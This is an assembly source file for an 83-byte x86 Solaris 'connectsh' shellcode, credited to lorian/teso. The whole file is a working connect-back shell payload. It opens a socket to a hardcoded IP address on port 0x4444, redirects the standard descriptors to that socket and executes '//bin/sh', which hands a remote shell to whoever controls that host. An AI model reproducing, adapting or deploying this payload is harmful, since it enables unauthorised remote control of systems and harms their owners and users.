/* x86/solaris connectsh shellcode (83 bytes)
   
   lorian / teso
*/

	.globl  _cbegin
	.globl	cbegin
	.globl  _cend
	.globl	cend

_cbegin:
cbegin:
	movl	$0x3cfff8ff, %eax
	notl	%eax
	pushl	%eax
	xorl	%ebp, %ebp
	mull	%ebp
	movb	$0x9a, %al
	pushl	%eax
	movl	%esp, %ecx
	
	pushl   %ebp
	incl    %ebp
	pushl   %ebp
	incl	%ebp
	pushl   %ebp
	movb    $0xe6, %al
	call	*%ecx
	xchgl   %esi, %eax
	pushl	$0xcab058c3
	pushw	$0x4444
	pushw	%bp
	movl	%esp, %edi
	pushl   $0x10
	pushl	%edi
	pushl   %esi
	xorl    %eax, %eax
	movb    $0xeb, %al
	call    *%ecx
a:      pusha
	pop     %esi
	movb	$0x3e, %al
	call	*%ecx
	decl	%ebp
	jns	a
	pushl	%edx
	push    $0x68732F6E
        push    $0x69622F2F
	movl	%esp, %ebx
	pushl	%edx
	pushl	%ebx
	movl	%esp, %edi
	pushl	%edx
	pushl	%edi
	pushl	%ebx
	movb	$0x3b, %al
	call	*%ecx
							
_cend:
cend:
